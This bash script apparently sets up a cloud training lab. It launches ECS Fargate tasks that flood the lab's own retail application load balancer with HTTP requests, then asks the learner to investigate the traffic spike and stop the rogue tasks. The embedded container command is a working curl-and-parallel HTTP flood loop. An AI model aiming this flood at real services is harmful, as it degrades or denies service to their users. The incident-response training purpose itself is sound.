#!/bin/bash
# Lab: DDoS Attack Simulation
# Deploys multiple ECS tasks that flood the retail application with HTTP requests
# Creates visible ALB metrics spike, increased latency, and potential service degradation

set -e

# Source common functions
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/common.sh"

# Initialize ECS lab environment
init_ecs_lab

BACKUP_DIR="/tmp/ecs_lab_ddos_backup"
NUM_ATTACK_TASKS="${NUM_ATTACK_TASKS:-3}"
REQUESTS_PER_SECOND="${REQUESTS_PER_SECOND:-100}"
mkdir -p $BACKUP_DIR

print_info "=============================================="
print_info "Lab: DDoS Attack Simulation"
print_info "=============================================="
echo ""

# Step 1: Find the ALB URL
print_info "[1/4] Finding Application Load Balancer..."

UI_SERVICE=$(aws ecs list-services --cluster $ECS_CLUSTER_NAME --region $AWS_REGION \
  --query "serviceArns[?contains(@, 'ui')]" --output text 2>/dev/null | head -1 | awk -F'/' '{print $NF}')

if [ -z "$UI_SERVICE" ] || [ "$UI_SERVICE" == "None" ]; then
  UI_SERVICE="ui"
fi

SERVICE_INFO=$(aws ecs describe-services --cluster $ECS_CLUSTER_NAME --services $UI_SERVICE --region $AWS_REGION 2>/dev/null)
TARGET_GROUP_ARN=$(echo "$SERVICE_INFO" | jq -r '.services[0].loadBalancers[0].targetGroupArn // empty')

if [ -z "$TARGET_GROUP_ARN" ]; then
  print_error "Could not find load balancer for UI service"
  exit 1
fi

ALB_ARN=$(aws elbv2 describe-target-groups --target-group-arns $TARGET_GROUP_ARN --region $AWS_REGION \
  --query 'TargetGroups[0].LoadBalancerArns[0]' --output text 2>/dev/null)

ALB_DNS=$(aws elbv2 describe-load-balancers --load-balancer-arns $ALB_ARN --region $AWS_REGION \
  --query 'LoadBalancers[0].DNSName' --output text 2>/dev/null)

if [ -z "$ALB_DNS" ] || [ "$ALB_DNS" == "None" ]; then
  print_error "Could not find ALB DNS name"
  exit 1
fi

TARGET_URL="http://${ALB_DNS}"
echo "  Target URL: $TARGET_URL"
echo "$TARGET_URL" > $BACKUP_DIR/target_url.txt
echo "$ALB_ARN" > $BACKUP_DIR/alb_arn.txt

# Step 2: Get network config
print_info "[2/4] Getting network configuration..."

NETWORK_CONFIG=$(echo "$SERVICE_INFO" | jq -r '.services[0].networkConfiguration.awsvpcConfiguration')
SUBNETS=$(echo "$NETWORK_CONFIG" | jq -r '.subnets | join(",")')
SECURITY_GROUPS=$(echo "$NETWORK_CONFIG" | jq -r '.securityGroups | join(",")')

TASK_DEF_ARN=$(echo "$SERVICE_INFO" | jq -r '.services[0].taskDefinition')
TASK_DEF=$(aws ecs describe-task-definition --task-definition $TASK_DEF_ARN --region $AWS_REGION --query 'taskDefinition' 2>/dev/null)
EXECUTION_ROLE=$(echo "$TASK_DEF" | jq -r '.executionRoleArn')
LOG_GROUP=$(echo "$TASK_DEF" | jq -r '.containerDefinitions[0].logConfiguration.options["awslogs-group"]')

echo "  Subnets: $SUBNETS"

# Step 3: Register attack task definition
print_info "[3/4] Registering HTTP flood task definition..."

cat > $BACKUP_DIR/attack_task_def.json <<TASKDEF
{
  "family": "http-flood-attack",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "512",
  "memory": "1024",
  "executionRoleArn": "${EXECUTION_ROLE}",
  "containerDefinitions": [
    {
      "name": "attacker",
      "image": "alpine:latest",
      "essential": true,
      "entryPoint": ["sh", "-c"],
      "command": [
        "apk add --no-cache curl parallel; echo 'HTTP FLOOD ATTACK STARTED'; echo 'Target: ${TARGET_URL}'; echo 'Sending ${REQUESTS_PER_SECOND} requests/second...'; while true; do seq 1 ${REQUESTS_PER_SECOND} | parallel -j ${REQUESTS_PER_SECOND} 'curl -s -o /dev/null -w \"%{http_code}\" ${TARGET_URL}/ 2>/dev/null || true' | tr -d '\\n'; echo \" - \$(date +%H:%M:%S)\"; sleep 1; done"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "${LOG_GROUP}",
          "awslogs-region": "${AWS_REGION}",
          "awslogs-stream-prefix": "http-flood-attack"
        }
      }
    }
  ]
}
TASKDEF

aws ecs register-task-definition \
  --cli-input-json file://$BACKUP_DIR/attack_task_def.json \
  --region $AWS_REGION > /dev/null

echo "  Registered http-flood-attack task"

# Step 4: Launch attack tasks
print_info "[4/4] Launching $NUM_ATTACK_TASKS HTTP flood tasks..."

TASK_ARNS=""
for i in $(seq 1 $NUM_ATTACK_TASKS); do
  TASK_ARN=$(aws ecs run-task \
    --cluster $ECS_CLUSTER_NAME \
    --task-definition http-flood-attack \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$SUBNETS],securityGroups=[$SECURITY_GROUPS],assignPublicIp=DISABLED}" \
    --region $AWS_REGION \
    --query 'tasks[0].taskArn' \
    --output text 2>/dev/null)
  
  echo "  Started attacker $i: $(echo $TASK_ARN | awk -F'/' '{print $NF}')"
  TASK_ARNS="$TASK_ARNS $TASK_ARN"
done

echo "$TASK_ARNS" > $BACKUP_DIR/attack_task_arns.txt
echo "$ECS_CLUSTER_NAME" > $BACKUP_DIR/cluster_name.txt

echo ""
print_info "Waiting for attack tasks to start..."
sleep 15

TOTAL_RPS=$((NUM_ATTACK_TASKS * REQUESTS_PER_SECOND))

echo ""
print_warning "=== DDOS ATTACK SIMULATION ACTIVE ==="
echo ""
print_info "=============================================="
print_info "SCENARIO:"
print_info "=============================================="
echo "ALERT: Unusual traffic spike detected!"
echo "The retail application is under heavy load."
echo "Users are experiencing slow page loads and timeouts."
echo "ALB metrics show massive request spike (~${TOTAL_RPS} req/s)."
echo ""
print_info "YOUR TASK:"
echo "1. Investigate the traffic spike in ALB metrics"
echo "2. Check CloudWatch for RequestCount and TargetResponseTime"
echo "3. Look for 5XX errors and unhealthy targets"
echo "4. Identify the source of the attack traffic"
echo "5. Find and stop the rogue ECS tasks"
echo ""
print_warning "Run 'rollback-ddos-simulation.sh' to stop the attack"
print_info "=============================================="
